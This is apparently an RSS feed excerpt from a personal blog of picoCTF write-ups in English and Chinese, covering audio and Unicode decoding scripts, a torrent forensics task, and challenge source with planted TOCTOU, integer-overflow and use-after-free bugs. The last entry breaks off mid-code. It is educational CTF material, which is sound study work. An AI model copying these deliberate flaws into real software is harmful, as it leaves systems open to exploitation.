&lt;code>1500 ~ 1509&lt;/code>
&lt;code>2000 ~ 2009&lt;/code>
&amp;hellip;
&lt;code>8500 ~ 8509&lt;/code>
It has exactly 16 intervals $\to$ hex value&lt;/li>
&lt;li>Let&amp;rsquo;s try to exploit it&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Whole exploit
:::spoiler exploit
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from scipy.io.wavfile import read
from tqdm import trange

path = &amp;#39;.&amp;#39;
rate, data = read(path + &amp;#34;/main.wav&amp;#34;)

decode_dic = {
 10 : &amp;#34;0&amp;#34;,
 15 : &amp;#34;1&amp;#34;,
 20 : &amp;#34;2&amp;#34;,
 25 : &amp;#34;3&amp;#34;,
 30 : &amp;#34;4&amp;#34;,
 35 : &amp;#34;5&amp;#34;,
 40 : &amp;#34;6&amp;#34;,
 45 : &amp;#34;7&amp;#34;,
 50 : &amp;#34;8&amp;#34;,
 55 : &amp;#34;9&amp;#34;,
 60 : &amp;#34;A&amp;#34;,
 65 : &amp;#34;B&amp;#34;,
 70 : &amp;#34;C&amp;#34;,
 75 : &amp;#34;D&amp;#34;,
 80 : &amp;#34;E&amp;#34;,
 85 : &amp;#34;F&amp;#34;,
}

message = &amp;#39;&amp;#39;
for i in trange(len(data)):
 message += decode_dic[data[i] // 100]

print(bytes.fromhex(message).decode())
&lt;/code>&lt;/pre>:::
Then you can get the source code and flag&amp;hellip;&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/tDPetapjm74">picoCTF 2021 Surfing the Waves&lt;/a>&lt;/p></description></item><item><title>PicoCTF - tic-tac</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---tic-tac/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---tic-tac/</guid><description>&lt;h1 id="picoctf---tic-tac">
 PicoCTF - tic-tac
 &lt;a class="anchor" href="#picoctf---tic-tac">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://myapollo.com.tw/blog/interview-question-race-condition/">後端工程師面試考什麼 - Race Condition 篇&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10208763"> [Day24]攻擊篇 &lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>TOCTTOU&lt;/p>
&lt;p>Time of check to time of use
在檢查和使用之間影響資源狀態的攻擊&lt;/p>
&lt;p>這種攻擊可能發生在共享資源中。
可能導致程式在資源處於意外狀態時執行無效操作。&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char *argv[]) {
 if (argc != 2) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Usage: &amp;#34; &amp;lt;&amp;lt; argv[0] &amp;lt;&amp;lt; &amp;#34; &amp;lt;filename&amp;gt;&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 std::string filename = argv[1];
 std::ifstream file(filename);
 struct stat statbuf;

 // Check the file&amp;#39;s status information.
 if (stat(filename.c_str(), &amp;amp;statbuf) == -1) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: Could not retrieve file information&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 // Check the file&amp;#39;s owner.
 if (statbuf.st_uid != getuid()) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: you don&amp;#39;t own this file&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 // Read the contents of the file.
 if (file.is_open()) {
 std::string line;
 while (getline(file, line)) {
 std::cout &amp;lt;&amp;lt; line &amp;lt;&amp;lt; std::endl;
 }
 } else {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: Could not open file&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Torrent Analyze</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/</guid><description>&lt;h1 id="picoctf---torrent-analyze">
 PicoCTF - Torrent Analyze
 &lt;a class="anchor" href="#picoctf---torrent-analyze">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.techworm.net/2017/03/seeds-peers-leechers-torrents-language.html">What are seeds, peers and leechers in Torrents’ language?&lt;/a>
&lt;a href="https://www.mobile01.com/topicdetail.php?f=507&amp;amp;t=1365797">慎選peer，是加速BT下載的王道！&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>seed個數：seed（即一般所說的「種子」）意指擁有完整檔案的BT參與者，是主要的檔案提供者。seed越多，可用的BT分享頻寬就越多，速度當然就快。&lt;/li>
&lt;li>seed與peer的比例：雖然peer（指尚未取得完整檔案的BT參與者）可同時自seed與其他peer下載檔案，但peer間會彼此競爭，以爭取有限的BT下載頻寬。因此，peer個數越多，分配後的BT分享頻寬就越少，速度自然就受影響。&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>&lt;a href="http://zfly9.blogspot.com/2014/10/hashmethod.html">教你該如何使用bt的info hash特徵碼，下載BT之torrent種子檔&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>SOS, someone is torrenting on our network. One of your colleagues has been using torrent to download some files on the company’s network. Can you identify the file(s) that were downloaded? The file name will be the flag, like picoCTF{filename}.
Hint 1: Download and open the file with a packet analyzer like &lt;a href="https://www.wireshark.org/">Wireshark&lt;/a>.
Hint 2: You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -&amp;gt; Enabled Protocols
Hint 3: Try to understand peers, leechers and seeds. &lt;a href="https://www.techworm.net/2017/03/seeds-peers-leechers-torrents-language.html">Article&lt;/a>
Hint 4: The file name ends with &lt;code>.iso&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Transformation</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---transformation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---transformation/</guid><description>&lt;h1 id="picoctf---transformation">
 PicoCTF - Transformation
 &lt;a class="anchor" href="#picoctf---transformation">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-reverse">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Reverse&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-reverse">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/104?category=3&amp;amp;page=1">Transformation&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>enc file content: &lt;code>灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽&lt;/code>
Transformation Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">&amp;#39;&amp;#39;.join([chr((ord(flag[i]) &amp;lt;&amp;lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
&lt;/code>&lt;/pre>&lt;p>Seems it shift the first character with 8 bits and concatenate the 2nd character then go through &lt;code>len(flag)&lt;/code>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>My perspective is just recover the strings
:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">flag = &amp;#39;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽&amp;#39;
enc = &amp;#39;&amp;#39;

def decimalToBinary(n):
 return bin(n).replace(&amp;#34;0b&amp;#34;, &amp;#34;&amp;#34;)

def binToHexa(n):
 bnum = int(n)
 temp = 0
 mul = 1
 count = 1
 hexaDeciNum = [&amp;#39;0&amp;#39;] * 100
 i = 0
 while bnum != 0:
 rem = bnum % 10
 temp = temp + (rem*mul)
 if count % 4 == 0:
 if temp &amp;lt; 10:
 hexaDeciNum[i] = chr(temp+48)
 else:
 hexaDeciNum[i] = chr(temp+55)
 mul = 1
 temp = 0
 count = 1
 i = i+1
 else:
 mul = mul*2
 count = count+1
 bnum = int(bnum/10)
 if count != 1:
 hexaDeciNum[i] = chr(temp+48)
 if count == 1:
 i = i-1
 hex_string = &amp;#39;&amp;#39;
 while i &amp;gt;= 0:
 hex_string += hexaDeciNum[i]
 i = i-1
 return hex_string


for i in range(0, len(flag)):
 plaintext1 = decimalToBinary(ord(flag[i]))
 while(len(plaintext1) != 16):
 plaintext1 = &amp;#39;0&amp;#39; + plaintext1
 plaintext2 = plaintext1[-8:]
 plaintext1 = plaintext1[0:8]
 enc += binToHexa(plaintext1)
 enc += binToHexa(plaintext2)
print(bytes.fromhex(enc).decode(&amp;#39;utf-8&amp;#39;))
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Trivial Flag Transfer Protocol</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/</guid><description>&lt;h1 id="picoctf---trivial-flag-transfer-protocol">
 PicoCTF - Trivial Flag Transfer Protocol
 &lt;a class="anchor" href="#picoctf---trivial-flag-transfer-protocol">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/103?bookmarked=0&amp;amp;category=4&amp;amp;page=1&amp;amp;search=&amp;amp;solved=0">Trivial Flag Transfer Protocol&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://tw511.com/a/01/2927.html">TFTP協定是什麼？&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.mobile01.com/topicdetail.php?f=110&amp;amp;t=921577">Wireless router中的UPnP是做什麼用的?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>UPnP 是一種通訊協定，其主要功能是供家中的設備可以輕易的且自動的連結到網路並完成網路相關設定。
不需要您本人手動去設定就可以使用的意思。
所以你的 router 有支援並打開這項功能後，您家中的視訊設備（大部分都是支援UPnP）接上網路、打開電源。
接著你的 作業系統也支援的話，以winodws 為例，「我的電腦」中就會看到您新增的設備，如無線router、media server等等。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/questions/10002825">SSDP - 通訊協定 ?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>SSDP的全寫是「Simple Service Discovery Protocol」，使用在Universal Plug and Play (UPnP)網絡環境中。SSDP使用UDP1900連接埠搜尋互聯網上的數據。當SSDP開啟時，其他設置會曝露自己到所有UPnP的用戶端中。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10278964">&lt;code>steghide&lt;/code> instruction&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---tftp--steghide">
 Exploit - TFTP + steghide
 &lt;a class="anchor" href="#exploit---tftp--steghide">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Save files
According to the article: &lt;a href="https://tw511.com/a/01/2927.html">TFTP協定是什麼？&lt;/a>, we can aware that this protocol is aim to transfer the data without authentication. So, we can download the files using wireshark.
&lt;img src="https://i.imgur.com/rETlGmm.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - two-sum</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---two-sum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---two-sum/</guid><description>&lt;h1 id="picoctf---two-sum">
 PicoCTF - two-sum
 &lt;a class="anchor" href="#picoctf---two-sum">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static int addIntOvf(int result, int a, int b) {
 result = a + b;
 if(a &amp;gt; 0 &amp;amp;&amp;amp; b &amp;gt; 0 &amp;amp;&amp;amp; result &amp;lt; 0)
 return -1;
 if(a &amp;lt; 0 &amp;amp;&amp;amp; b &amp;lt; 0 &amp;amp;&amp;amp; result &amp;gt; 0)
 return -1;
 return 0;
}

int main() {
 int num1, num2, sum;
 FILE *flag;
 char c;

 printf(&amp;#34;n1 &amp;gt; n1 + n2 OR n2 &amp;gt; n1 + n2 \n&amp;#34;);
 fflush(stdout);
 printf(&amp;#34;What two positive numbers can make this possible: \n&amp;#34;);
 fflush(stdout);
 
 if (scanf(&amp;#34;%d&amp;#34;, &amp;amp;num1) &amp;amp;&amp;amp; scanf(&amp;#34;%d&amp;#34;, &amp;amp;num2)) {
 printf(&amp;#34;You entered %d and %d\n&amp;#34;, num1, num2);
 fflush(stdout);
 sum = num1 + num2;
 if (addIntOvf(sum, num1, num2) == 0) {
 printf(&amp;#34;No overflow\n&amp;#34;);
 fflush(stdout);
 exit(0);
 } else if (addIntOvf(sum, num1, num2) == -1) {
 printf(&amp;#34;You have an integer overflow\n&amp;#34;);
 fflush(stdout);
 }

 if (num1 &amp;gt; 0 || num2 &amp;gt; 0) {
 flag = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if(flag == NULL){
 printf(&amp;#34;flag not found: please run this on the server\n&amp;#34;);
 fflush(stdout);
 exit(0);
 }
 char buf[60];
 fgets(buf, 59, flag);
 printf(&amp;#34;YOUR FLAG IS: %s\n&amp;#34;, buf);
 fflush(stdout);
 exit(0);
 }
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Unsubscriptions Are Free</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/</guid><description>&lt;h1 id="picoctf---unsubscriptions-are-free">
 PicoCTF - Unsubscriptions Are Free
 &lt;a class="anchor" href="#picoctf---unsubscriptions-are-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Heap Exploitation / Used After Free&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdint.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;ctype.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define FLAG_BUFFER 200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define LINE_BUFFER_SIZE 20
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	uintptr_t (&lt;span style="color:#f92672">*&lt;/span>whatToDo)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>username;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> choice;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cmd &lt;span style="color:#f92672">*&lt;/span>user;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">hahaexploitgobrrr&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	&lt;span style="color:#66d9ef">char&lt;/span> buf[FLAG_BUFFER];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> fopen(&lt;span style="color:#e6db74">&amp;#34;flag.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fgets(buf,FLAG_BUFFER,f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fprintf(stdout,&lt;span style="color:#e6db74">&amp;#34;%s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fflush(stdout);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">getsline&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	getchar();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> line &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">100&lt;/span>), &lt;span style="color:#f92672">*&lt;/span> linep &lt;span style="color:#f92672">=&lt;/span> line;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	size_t lenmax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>, len &lt;span style="color:#f92672">=&lt;/span> lenmax;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> c;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(line &lt;span style="color:#f92672">==&lt;/span> NULL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span>(;;) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		c &lt;span style="color:#f92672">=&lt;/span> fgetc(stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>(c &lt;span style="color:#f92672">==&lt;/span> EOF)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">--&lt;/span>len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			len &lt;span style="color:#f92672">=&lt;/span> lenmax;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> linen &lt;span style="color:#f92672">=&lt;/span> realloc(linep, lenmax &lt;span style="color:#f92672">*=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">if&lt;/span>(linen &lt;span style="color:#f92672">==&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				free(linep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			line &lt;span style="color:#f92672">=&lt;/span> linen &lt;span style="color:#f92672">+&lt;/span> (line &lt;span style="color:#f92672">-&lt;/span> linep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			linep &lt;span style="color:#f92672">=&lt;/span> linen;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>((&lt;span style="color:#f92672">*&lt;/span>line&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> c) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">*&lt;/span>line &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> linep;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doProcess&lt;/span>(cmd&lt;span style="color:#f92672">*&lt;/span> obj) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	(&lt;span style="color:#f92672">*&lt;/span>obj&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">s&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	printf(&lt;span style="color:#e6db74">&amp;#34;OOP! Memory leak...%p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,hahaexploitgobrrr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Thanks for subsribing! I really recommend becoming a premium member!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Membership pending... (There&amp;#39;s also a super-subscription you can also get for twice the price!)&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">m&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Account created.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">leaveMessage&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;I only read premium member messages but you can &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;try anyways:&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> msg &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, msg, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> response;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;You&amp;#39;re leaving already(Y/N)?&amp;#34;&lt;/span>);
